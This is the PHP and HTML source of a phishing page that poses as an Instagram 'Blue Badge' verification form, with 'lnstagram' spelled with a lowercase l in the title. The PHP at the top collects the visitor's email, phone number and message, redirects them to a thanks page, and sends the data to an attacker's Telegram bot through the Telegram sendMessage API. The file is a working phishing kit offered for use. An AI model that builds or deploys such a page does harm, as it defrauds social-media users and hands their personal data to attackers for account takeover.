<?php
include('api/tg.php');
session_start();
$id=$_SESSION['username'];
$pp=$_SESSION['pp'];

if (empty($l_p)) {
  $l_p='files/private.png';
}

if($_POST){
    $tel=$_POST["tel"];
    $mail=$_POST["mail"];
    $objection=$_POST["objection"];

    header("location: thanks.php");

    $data = [
      'text' => '➡️ '.$username.' Form  😈 
    
    Mail : '.$mail.'
    Tel : '.$tel.'
    Metin  : '.$objection.'
    ',
      'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    }
    ?>

<!DOCTYPE html>

<html>
<head>
	<link rel="stylesheet" href="files/style.css" type="text/css" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/xcode.css">
	<link rel="stylesheet" type="text/css" href="css/xcode2.css">
	<link rel="stylesheet" type="text/css" href="css/xcode3.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.hizliresim.com/egpgwd2.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">

	<title>lnstagram | Blue Badge</title>
    <style>
	   textarea {
  resize: none;
}
         /* Chrome, Safari, Edge, Opera */
         input::-webkit-outer-spin-button,
     input::-webkit-inner-spin-button {
     -webkit-appearance: none;
     margin: 0;
}

     /* Firefox */
     input[type=number] {
     -moz-appearance: textfield;
}
*{
	transition:0.0s;
}
.a_adaskpd{
      padding:7px 30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#08a0e9;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
	  }
    button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 18px;
}
.button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
}
.btn {
    cursor: pointer;
    width: 100%;
    padding: 0 8px;
    background: #3897f0;
    border: 1px solid #3897f0;
    color: #fff;
    border-radius: 3px;
    font-weight: 600;
    font-size: 14px;
    height: 30px;
    line-height: 26px;
    outline: 0;
    white-space: nowrap;
}
@media (max-width: 450px) {
    .btn {
        cursor: pointer;
        width: 100%;
        padding: 0 8px;
        background: #3897f0;
        border: 1px solid #3897f0;
        color: #fff;
        border-radius: 3px;
        font-weight: 600;
        font-size: 14px;
        height: 28px;
        line-height: 26px;
        outline: 0;
        white-space: nowrap;
    }
}
</style>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="https://i.hizliresim.com/sbhdd6g.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
	</header><br><br>
<center>

<div class="center" style="background: white; border-radius:4px;">

<div  style="margin-bottom:13%;"></div>
<!-- <br>-->
<img src="<?=$pp?>" width="50" align="left" style="border-radius:50%;margin-left:5px;display:none;">
<!--  <br><br>-->
<center>

        <center>
			<img src="<?=$pp?>" width="150" style="border-radius:50%;"></center>
<div  style="margin-bottom:5%;"></div>
<h2 class="AjK3K" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif; margin: 0 auto 3px;" align="center"><b>Blue Badge Application Form</b></h2>

<form class="JraEb" method="POST">
<div  style="margin-bottom:7%;"></div>
      <input style="width: 80%;" required name="name" placeholder="Full Name" type="text" class="PAhYv zyHYP ">
      <div  style="margin-bottom:20px;"></div>
      <input style="width: 80%; opacity: 0.9;" required name="username" placeholder="Username" type="text" value="<?php echo $id?>" disabled class="PAhYv zyHYP ">
            <div  style="margin-bottom:20px;"></div>
			<input style="width: 80%; " required name="mail" placeholder="E-Mail Address" type="email" class="PAhYv zyHYP ">
            <div  style="margin-bottom:20px;"></div>
            <input style="width: 80%;" required name="tel" placeholder="Phone number" type="number" class="PAhYv zyHYP ">
            <div  style="margin-bottom:20px;"></div>
            <textarea style="width: 80%; height:80px;" required name="objection" placeholder="Explained (Optional)" type="text" class="PAhYv"></textarea>
            <div style="font-family:sans-serif; margin-top:10px;"  >
            <span class="button-box">
<button class="btn" type="submit" name="submit">Send</button>
 </span>  
		      <!--<span class="idhGk _1OSdk">
            <div  style="margin-bottom:15px;"></div>
            <center><button type="submit"  style="margin-top:6px;width:230px;background: #3897f0; border-color: #3897f0; color: #fff; " class="a_adaskpd">Send</button></center>-->
             <div  style="margin-bottom:15px;"></div>
            </form>
            </div>
</center>

</div>
<br>
<br>
</center>

</body>
</html>